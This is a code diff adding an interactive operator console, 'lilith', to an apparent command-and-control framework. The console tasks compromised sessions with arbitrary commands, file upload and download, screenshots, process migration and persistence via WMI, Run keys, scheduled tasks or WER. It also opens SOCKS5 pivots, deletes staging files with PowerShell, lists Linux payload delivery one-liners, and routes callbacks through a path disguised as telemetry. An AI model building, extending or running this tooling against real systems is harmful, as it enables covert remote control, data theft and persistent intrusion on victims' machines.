@@ -934,6 +934,638 @@ def cmd_linux(args, cfg, ws):
     print()
 
 
+def cmd_console(args, cfg, ws):
+    """Interactive console — server in background, all operations inline."""
+    import http.client as _hc
+    import threading as _thr
+    import time as _tm
+    import readline as _rl
+
+    mgmt_port = cfg.get("mgmt_port", 8444)
+    wait_secs = [cfg.get("c2_timeout_s", 50)]
+    _active_sid = [None]      # currently selected session
+    _server_up  = [False]
+
+    # ── Readline history ───────────────────────────────────────────────────────
+    _hist = os.path.expanduser("~/.lilith_console_history")
+    try:
+        _rl.read_history_file(_hist)
+    except FileNotFoundError:
+        pass
+    _rl.set_history_length(500)
+
+    COMMANDS = [
+        "help", "sessions", "ls", "use", "unuse", "status",
+        "run", "cmd", "upload", "download", "screenshot",
+        "migrate", "persist", "kill", "cleanup",
+        "socks", "nosocks",
+        "ask",
+        "findings", "find",
+        "build", "linux", "serve",
+        "quit", "exit",
+    ]
+    def _complete(text, state):
+        options = [c for c in COMMANDS if c.startswith(text)]
+        return options[state] if state < len(options) else None
+    _rl.set_completer(_complete)
+    _rl.parse_and_bind("tab: complete")
+
+    # ── mgmt helpers ──────────────────────────────────────────────────────────
+    def _get(path):
+        try:
+            c = _hc.HTTPConnection("127.0.0.1", mgmt_port, timeout=5)
+            c.request("GET", path)
+            r = c.getresponse(); body = r.read(); c.close()
+            return r.status, body
+        except Exception as e:
+            return None, str(e).encode()
+
+    def _post(path, payload):
+        try:
+            b = json.dumps(payload).encode()
+            c = _hc.HTTPConnection("127.0.0.1", mgmt_port, timeout=5)
+            c.request("POST", path, b, {"Content-Type": "application/json"})
+            r = c.getresponse(); body = r.read(); c.close()
+            return r.status, body
+        except Exception as e:
+            return None, str(e).encode()
+
+    def _delete(path):
+        try:
+            c = _hc.HTTPConnection("127.0.0.1", mgmt_port, timeout=5)
+            c.request("DELETE", path)
+            r = c.getresponse(); body = r.read(); c.close()
+            return r.status, body
+        except Exception as e:
+            return None, str(e).encode()
+
+    def _check_server():
+        st, _ = _get("/mgmt/sessions")
+        return st == 200
+
+    def _push_and_wait(sid, cmd_str):
+        st, body = _post(f"/mgmt/{sid}/task", {"cmd": cmd_str})
+        if st is None:
+            print(f"  [!] mgmt unreachable — run: serve")
+            return None
+        if st == 404:
+            print(f"  [!] Session {sid} not found")
+            return None
+        try:
+            tid = json.loads(body)["task_id"]
+        except Exception:
+            print(f"  [!] {body.decode()[:120]}")
+            return None
+        deadline = _tm.time() + wait_secs[0]
+        while _tm.time() < deadline:
+            st2, b2 = _get(f"/mgmt/{sid}/result/{tid}")
+            if st2 == 200:
+                try:
+                    return json.loads(b2)["output"]
+                except Exception:
+                    return b2.decode()
+            _tm.sleep(0.8)
+        print(f"  [!] Timeout — use: timeout <sec>")
+        return None
+
+    def _sessions_table(sessions):
+        if not sessions:
+            print("  [*] No active sessions")
+            return
+        print(f"\n  {'#':<4} {'ID':<18} {'Host':<18} {'Pending':<8} {'Last seen':<10} Status")
+        print("  " + "─" * 66)
+        for i, (sid, info) in enumerate(sessions.items()):
+            marker = "►" if sid == _active_sid[0] else " "
+            status = "\033[31mSTALE\033[0m" if info.get("stale") else "\033[32malive\033[0m"
+            print(f"  {marker}{i:<3} {sid:<18} {info['host']:<18} {info['pending']:<8} {info['last_seen']:<10} {status}")
+        print()
+
+    def _prompt():
+        if _active_sid[0]:
+            sid_short = _active_sid[0][:10]
+            return f"\033[36mlilith\033[0m [\033[33m{sid_short}\033[0m] \033[90m»\033[0m "
+        return "\033[36mlilith\033[0m \033[90m»\033[0m "
+
+    # ── Banner ─────────────────────────────────────────────────────────────────
+    print("\n\033[90m  ╔══════════════════════════════════════════════════════════╗")
+    print("  ║  lilith  interactive console  |  type 'help'            ║")
+    print("  ╚══════════════════════════════════════════════════════════╝\033[0m\n")
+
+    # Check if server already running
+    if _check_server():
+        _server_up[0] = True
+        print("  [+] Server already running on mgmt port", mgmt_port)
+        st, body = _get("/mgmt/sessions")
+        try:
+            sessions = json.loads(body)
+            if sessions:
+                _sessions_table(sessions)
+                # auto-select first session if only one
+                if len(sessions) == 1:
+                    _active_sid[0] = list(sessions.keys())[0]
+                    print(f"  [*] Auto-selected session: {_active_sid[0]}")
+        except Exception:
+            pass
+
+    # ── Main loop ──────────────────────────────────────────────────────────────
+    while True:
+        try:
+            line = input(_prompt()).strip()
+        except (EOFError, KeyboardInterrupt):
+            print()
+            break
+        if not line:
+            continue
+
+        parts = line.split()
+        cmd   = parts[0].lower()
+        rest  = parts[1:]
+
+        # ── help ──────────────────────────────────────────────────────────────
+        if cmd == "help":
+            print("""
+  Server:
+    serve [--port P] [--mgmt-port P]  Start HTTPS+mgmt servers in background
+    status                            Show server and session status
+
+  Sessions:
+    sessions / ls                     List active C2 sessions
+    use <#|id>                        Select session by index or ID prefix
+    unuse                             Deselect current session
+
+  C2 (requires active session):
+    <any command>                     Send command to active session
+    run <TOOL> [-- params]            Dispatch arsenal tool (auto-encodes)
+    upload <local> <remote>           Upload file to target
+    download <remote> [local]         Download file from target
+    screenshot [out.bmp]              Capture desktop
+    migrate [proc.exe]                Migrate to another process
+    persist wmi|run|schtask|wer       Install persistence
+    cleanup                           Remove staging files
+    kill [SID]                        Kill a session
+
+  Tunneling:
+    socks [PORT]                      Start SOCKS5 proxy (default 1080)
+    nosocks                           Stop SOCKS5 for active session
+    socks status                      Show active SOCKS5 proxies
+
+  Intelligence:
+    ask <question>                    Consult Astaroth AI (uses session context)
+    findings [--session SID]          List engagement findings from DB
+    find <text> [--sev high]          Add finding for active session
+
+  Build & Arsenal:
+    build <args>                      Run build command (same as lilith build)
+    linux [--cat CAT]                 Linux arsenal with delivery one-liners
+
+  Other:
+    timeout <sec>                     Set command wait timeout
+    quit / exit / Ctrl+C              Exit console
+""")
+            continue
+
+        # ── quit ─────────────────────────────────────────────────────────────
+        if cmd in ("quit", "exit"):
+            break
+
+        # ── serve ─────────────────────────────────────────────────────────────
+        if cmd == "serve":
+            if _server_up[0]:
+                print("  [*] Server already running")
+                continue
+            from server.https_server import start_server, set_engage_db, set_linux_dir
+            from core.engage import EngagementDB
+            from server.https_server import set_ui_token, restore_c2_sessions_from_db
+            from builders.linux_tools import get_linux_dir
+
+            port      = cfg.get("http_port", 8443)
+            _mgmt_p   = cfg.get("mgmt_port", 8444)
+            for a in rest:
+                if a.startswith("--port="):
+                    port = int(a.split("=")[1])
+                elif a.startswith("--mgmt-port="):
+                    _mgmt_p = int(a.split("=")[1])
+
+            db_path = ws.path("engagement.db")
+            db = EngagementDB(db_path)
+            set_engage_db(db)
+
+            _lx_dir = get_linux_dir()
+            if os.path.isdir(_lx_dir):
+                set_linux_dir(_lx_dir)
+
+            try:
+                from server.astaroth import configure as _ast_configure
+                _ast_configure(cfg.get("astaroth", {}))
+            except Exception:
+                pass
+
+            ui_tok = cfg.get("ui_token", "")
+            if ui_tok:
+                for t in [x.strip() for x in ui_tok.split(",") if x.strip()]:
+                    set_ui_token(t)
+
+            restored = restore_c2_sessions_from_db(db)
+            print(f"  [*] Starting server on :{port} (mgmt :{_mgmt_p})")
+            if restored:
+                print(f"  [+] {restored} session(s) restored from DB")
+
+            t = _thr.Thread(
+                target=start_server,
+                kwargs=dict(
+                    workspace=ws.directory,
+                    lhost="0.0.0.0",
+                    port=port,
+                    mgmt_port=_mgmt_p,
+                    callback_prefix=cfg.get("callback_path", "/api/diagnostics/v1/telemetry"),
+                    callback_host=cfg.get("lhost", ""),
+                ),
+                daemon=True,
+            )
+            t.start()
+            _tm.sleep(1.5)
+            if _check_server():
+                _server_up[0] = True
+                print(f"  [+] Server running — HTTPS :{port} | mgmt :{_mgmt_p} | LHOST {cfg.get('lhost','?')}")
+            else:
+                print("  [!] Server may still be starting — wait a moment and run: status")
+            continue
+
+        # ── status ────────────────────────────────────────────────────────────
+        if cmd == "status":
+            if not _check_server():
+                print("  [!] Server not running — type: serve")
+                continue
+            st, body = _get("/mgmt/sessions")
+            try:
+                sessions = json.loads(body)
+                print(f"\n  Server up | mgmt :{mgmt_port} | timeout {wait_secs[0]}s")
+                _sessions_table(sessions)
+            except Exception:
+                print("  [!] Could not parse sessions")
+            continue
+
+        # ── sessions / ls ─────────────────────────────────────────────────────
+        if cmd in ("sessions", "ls"):
+            if not _server_up[0] and not _check_server():
+                print("  [!] Server not running — type: serve")
+                continue
+            st, body = _get("/mgmt/sessions")
+            try:
+                _sessions_table(json.loads(body))
+            except Exception:
+                print("  [!] No sessions or server down")
+            continue
+
+        # ── use ───────────────────────────────────────────────────────────────
+        if cmd == "use":
+            if not rest:
+                print("  Usage: use <#|session_id_prefix>")
+                continue
+            st, body = _get("/mgmt/sessions")
+            try:
+                sessions = json.loads(body)
+            except Exception:
+                print("  [!] Cannot reach server")
+                continue
+            target = rest[0]
+            # try numeric index first
+            try:
+                idx = int(target)
+                sids = list(sessions.keys())
+                if 0 <= idx < len(sids):
+                    _active_sid[0] = sids[idx]
+                    info = sessions[sids[idx]]
+                    print(f"  [*] Active: {_active_sid[0]} ({info['host']})")
+                else:
+                    print(f"  [!] Index {idx} out of range (0-{len(sids)-1})")
+            except ValueError:
+                # try prefix match
+                matches = [s for s in sessions if s.startswith(target)]
+                if len(matches) == 1:
+                    _active_sid[0] = matches[0]
+                    info = sessions[matches[0]]
+                    print(f"  [*] Active: {_active_sid[0]} ({info['host']})")
+                elif len(matches) > 1:
+                    print(f"  [!] Ambiguous prefix '{target}' — matches: {', '.join(matches)}")
+                else:
+                    print(f"  [!] No session matching '{target}'")
+            continue
+
+        # ── unuse ─────────────────────────────────────────────────────────────
+        if cmd == "unuse":
+            _active_sid[0] = None
+            print("  [*] Session deselected")
+            continue
+
+        # ── timeout ───────────────────────────────────────────────────────────
+        if cmd == "timeout":
+            if rest:
+                try:
+                    wait_secs[0] = int(rest[0])
+                    print(f"  [*] Timeout set to {wait_secs[0]}s")
+                except ValueError:
+                    print("  Usage: timeout <seconds>")
+            else:
+                print(f"  Current timeout: {wait_secs[0]}s")
+            continue
+
+        # ── kill ──────────────────────────────────────────────────────────────
+        if cmd == "kill":
+            target = rest[0] if rest else _active_sid[0]
+            if not target:
+                print("  Usage: kill <session_id>")
+                continue
+            st, _ = _delete(f"/mgmt/{target}")
+            if st == 200:
+                print(f"  [+] Session {target} killed")
+                if _active_sid[0] == target:
+                    _active_sid[0] = None
+            else:
+                print(f"  [!] Kill failed (status {st})")
+            continue
+
+        # ── run TOOL ─────────────────────────────────────────────────────────
+        if cmd == "run":
+            if not _active_sid[0]:
+                print("  [!] No active session — type: use <#>")
+                continue
+            if not rest:
+                print("  Usage: run <TOOL> [-- params]")
+                continue
+            tool_name = rest[0]
+            # everything after -- is params
+            params = None
+            if "--" in rest:
+                idx2 = rest.index("--")
+                params = " ".join(rest[idx2+1:])
+            payload = {"tool": tool_name}
+            if params is not None:
+                payload["params"] = params
+            print(f"  [*] Dispatching {tool_name} to {_active_sid[0][:10]}...")
+            st, body = _post(f"/mgmt/{_active_sid[0]}/tool", payload)
+            try:
+                resp = json.loads(body)
+                if "task_id" in resp:
+                    print(f"  [+] Task queued: {resp['task_id']}")
+                else:
+                    print(f"  [!] {resp.get('error', body.decode())}")
+            except Exception:
+                print(f"  [!] {body.decode()[:200]}")
+            continue
+
+        # ── socks ─────────────────────────────────────────────────────────────
+        if cmd == "socks":
+            if rest and rest[0] == "status":
+                st, body = _get("/mgmt/socks5")
+                try:
+                    data = json.loads(body)
+                    if not data:
+                        print("  No active SOCKS5 proxies")
+                    else:
+                        for sid, info in data.items():
+                            print(f"  {sid}: 127.0.0.1:{info['port']}")
+                except Exception:
+                    pass
+                continue
+            if not _active_sid[0]:
+                print("  [!] No active session — type: use <#>")
+                continue
+            port = 1080
+            if rest and rest[0] != "status":
+                try:
+                    port = int(rest[0])
+                except ValueError:
+                    pass
+            st, body = _post(f"/mgmt/socks5/{_active_sid[0]}", {"port": port})
+            try:
+                resp = json.loads(body)
+                if "error" in resp:
+                    print(f"  [!] {resp['error']}")
+                else:
+                    print(f"  [+] SOCKS5 listening on 127.0.0.1:{port} → session {_active_sid[0][:10]}")
+                    print(f"      proxychains: socks5 127.0.0.1 {port}")
+            except Exception:
+                print(f"  [!] {body.decode()[:120]}")
+            continue
+
+        # ── nosocks ───────────────────────────────────────────────────────────
+        if cmd == "nosocks":
+            target = (rest[0] if rest else None) or _active_sid[0]
+            if not target:
+                print("  [!] No session — use: nosocks <SID>")
+                continue
+            st, body = _delete(f"/mgmt/socks5/{target}")
+            try:
+                resp = json.loads(body)
+                print(f"  [+] {resp.get('status', 'stopped')}")
+            except Exception:
+                print(f"  [!] {body.decode()[:80]}")
+            continue
+
+        # ── ask ───────────────────────────────────────────────────────────────
+        if cmd == "ask":
+            question = " ".join(rest).strip()
+            if not question:
+                print("  Usage: ask <question>")
+                continue
+            sid = _active_sid[0] or ""
+            print("  \033[90m[Astaroth thinking...]\033[0m", flush=True)
+            st, body = _post("/mgmt/astaroth", {"question": question, "session_id": sid})
+            try:
+                resp = json.loads(body)
+                if "answer" in resp:
+                    print(f"\n\033[33m  Astaroth\033[0m\n{resp['answer']}\n")
+                else:
+                    print(f"  [!] {resp.get('error', body.decode()[:200])}")
+            except Exception:
+                print(f"  [!] {body.decode()[:200]}")
+            continue
+
+        # ── findings ──────────────────────────────────────────────────────────
+        if cmd == "findings":
+            st, body = _get("/mgmt/findings")
+            try:
+                rows = json.loads(body)
+                if not rows:
+                    print("  No findings recorded")
+                else:
+                    print(f"\n  {'ID':<5} {'Sev':<8} {'Session':<14} Text")
+                    print("  " + "─" * 70)
+                    for row in rows:
+                        sev = row.get("severity", "medium")
+                        color = "\033[31m" if sev == "critical" else "\033[33m" if sev == "high" else ""
+                        print(f"  {row['id']:<5} {color}{sev:<8}\033[0m {str(row.get('session_id','')):<14} {row.get('text','')[:60]}")
+                    print()
+            except Exception:
+                print(f"  [!] {body.decode()[:120]}")
+            continue
+
+        # ── find ──────────────────────────────────────────────────────────────
+        if cmd == "find":
+            if not rest:
+                print("  Usage: find <text> [--sev critical|high|medium|low]")
+                continue
+            sev = "medium"
+            text_parts = []
+            skip_next = False
+            for i, tok in enumerate(rest):
+                if skip_next:
+                    skip_next = False
+                    continue
+                if tok == "--sev" and i + 1 < len(rest):
+                    sev = rest[i + 1]
+                    skip_next = True
+                else:
+                    text_parts.append(tok)
+            text = " ".join(text_parts)
+            payload = {"text": text, "severity": sev, "session_id": _active_sid[0] or ""}
+            st, body = _post("/mgmt/findings", payload)
+            try:
+                resp = json.loads(body)
+                if "id" in resp:
+                    print(f"  [+] Finding #{resp['id']} recorded ({sev})")
+                else:
+                    print(f"  [!] {resp.get('error', body.decode())}")
+            except Exception:
+                print(f"  [!] {body.decode()[:120]}")
+            continue
+
+        # ── upload ────────────────────────────────────────────────────────────
+        if cmd == "upload":
+            if not _active_sid[0] or len(rest) < 2:
+                print("  Usage: upload <local_path> <remote_path>")
+                continue
+            result = _push_and_wait(_active_sid[0], f"upload {rest[0]} {rest[1]}")
+            if result:
+                print(f"  {result}")
+            continue
+
+        # ── download ──────────────────────────────────────────────────────────
+        if cmd == "download":
+            if not _active_sid[0] or not rest:
+                print("  Usage: download <remote_path> [local_path]")
+                continue
+            import base64 as _b64
+            remote = rest[0]
+            out    = rest[1] if len(rest) > 1 else os.path.basename(remote)
+            result = _push_and_wait(_active_sid[0], f"download {remote}")
+            if result:
+                if result.startswith("_BIN_B64:\n"):
+                    raw = _b64.b64decode(result[10:])
+                    with open(out, "wb") as _f:
+                        _f.write(raw)
+                    print(f"  [+] Saved {len(raw):,}B → {out}")
+                else:
+                    print(f"  {result}")
+            continue
+
+        # ── screenshot ────────────────────────────────────────────────────────
+        if cmd == "screenshot":
+            if not _active_sid[0]:
+                print("  [!] No active session")
+                continue
+            import base64 as _b64
+            out = rest[0] if rest else "screenshot.bmp"
+            result = _push_and_wait(_active_sid[0], "screenshot")
+            if result and result.startswith("_BIN_B64:\n"):
+                raw = _b64.b64decode(result[10:])
+                with open(out, "wb") as _f:
+                    _f.write(raw)
+                print(f"  [+] Saved → {out}")
+            elif result:
+                print(f"  {result}")
+            continue
+
+        # ── migrate ───────────────────────────────────────────────────────────
+        if cmd == "migrate":
+            if not _active_sid[0]:
+                print("  [!] No active session")
+                continue
+            target = rest[0] if rest else ""
+            result = _push_and_wait(_active_sid[0], f"migrate {target}".strip())
+            if result:
+                print(f"  {result}")
+            continue
+
+        # ── persist ───────────────────────────────────────────────────────────
+        if cmd == "persist":
+            if not _active_sid[0]:
+                print("  [!] No active session")
+                continue
+            if not rest:
+                print("  Usage: persist wmi|run|schtask|wer")
+                continue
+            pcmd = _build_persist_cmd(rest[0], cfg, ws)
+            if not pcmd:
+                continue
+            result = _push_and_wait(_active_sid[0], pcmd)
+            if result:
+                print(f"  {result}")
+            continue
+
+        # ── cleanup ───────────────────────────────────────────────────────────
+        if cmd == "cleanup":
+            if not _active_sid[0]:
+                print("  [!] No active session")
+                continue
+            runner_name = ws.get_enc_name("__runner_dat__") or "runner_c.dat"
+            clean_cmd = (
+                f'Remove-Item "$env:TEMP\\{runner_name}" -Force -EA SilentlyContinue; '
+                f'Get-ChildItem $env:TEMP -Filter "wct*.exe" | Remove-Item -Force -EA SilentlyContinue; '
+                f'"[+] cleanup done"'
+            )
+            result = _push_and_wait(_active_sid[0], clean_cmd)
+            if result:
+                print(f"  {result}")
+            continue
+
+        # ── build ─────────────────────────────────────────────────────────────
+        if cmd == "build":
+            import subprocess as _sp
+            build_args = [sys.executable, __file__, "build"] + rest
+            _sp.run(build_args)
+            continue
+
+        # ── linux ─────────────────────────────────────────────────────────────
+        if cmd == "linux":
+            from builders.linux_tools import LINUX_TOOL_CATALOG, find_linux_tool, get_linux_dir
+            lhost    = cfg.get("lhost", "LHOST")
+            cat_filt = ""
+            for i, tok in enumerate(rest):
+                if tok == "--cat" and i + 1 < len(rest):
+                    cat_filt = rest[i + 1].lower()
+            items = [(n, v) for n, v in LINUX_TOOL_CATALOG.items() if not cat_filt or v.get("category") == cat_filt]
+            cats: dict = {}
+            for name, info in items:
+                cats.setdefault(info["category"], []).append((name, info))
+            for cat, entries in cats.items():
+                print(f"\n  [{cat.upper()}]")
+                for name, info in entries:
+                    found    = "✓" if find_linux_tool(name) else "✗"
+                    one_line = info.get("default_run", "").replace("LHOST", lhost)
+                    print(f"  [{found}] {name:<26} {info['desc']}")
+                    print(f"       \033[2m{one_line}\033[0m")
+            print()
+            continue
+
+        # ── default: send to active session ───────────────────────────────────
+        if _active_sid[0]:
+            result = _push_and_wait(_active_sid[0], line)
+            if result is not None:
+                print(result)
+        else:
+            print(f"  [?] Unknown command '{cmd}' — no active session to forward to.")
+            print("      Type 'help' for commands, or 'use <#>' to select a session first.")
+
+    # ── Save readline history on exit ─────────────────────────────────────────
+    try:
+        _rl.write_history_file(_hist)
+    except Exception:
+        pass
+    print("  [*] Console closed.")
+
+
 def cmd_serve(args, cfg, ws):
     from core.engage import EngagementDB
     from server.https_server import set_ui_token, restore_c2_sessions_from_db
@@ -1656,6 +2288,8 @@ def main():
     webdav_p.add_argument("--webdav-port", metavar="PORT", dest="webdav_port", type=int, default=None,
                           help="HTTP port for WebDAV server (default: webdav_port from config, or 8080)")
 
+    sub.add_parser("console", help="Interactive console — Ligolo-style: server in background, all commands inline")
+
     linux_p = sub.add_parser("linux", help="Linux post-exploitation arsenal — list tools and delivery one-liners")
     linux_p.add_argument("--lhost", metavar="IP", default="",
                          help="LHOST to embed in curl one-liners (default: engagement lhost)")
@@ -1682,12 +2316,15 @@ def main():
                        help="Output file for --export (default: engagement_report.json / .md)")
 
     args = parser.parse_args()
-    if not args.command:
-        parser.print_help()
-        sys.exit(0)
-
     cfg = load_config()
     ws  = Workspace()
+
+    if not args.command:
+        # No subcommand → interactive console (Ligolo-style)
+        import types
+        args = types.SimpleNamespace(command="console")
+        cmd_console(args, cfg, ws)
+        return
 
     dispatch = {
         "init":    cmd_init,
@@ -1701,6 +2338,7 @@ def main():
         "xdr":     cmd_xdr,
         "engage":  cmd_engage,
         "linux":   cmd_linux,
+        "console": cmd_console,
     }
     dispatch[args.command](args, cfg, ws)
 
